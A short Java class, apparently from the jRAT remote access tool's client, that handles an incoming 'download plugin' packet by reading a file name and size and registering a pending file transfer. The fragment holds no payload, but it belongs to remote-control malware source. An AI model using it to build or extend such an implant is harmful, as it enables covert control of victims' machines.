package jrat.client.packets.incoming;

import io.jrat.common.io.FileCache;
import io.jrat.common.io.TransferData;
import jrat.client.Connection;

public class Packet106ClientDownloadPlugin extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.readBoolean();
		String f = con.readLine();
		long l = con.readLong();

		TransferData d = new TransferData(true);
		d.setTotal(l);

		FileCache.put(f, d);
	}

}
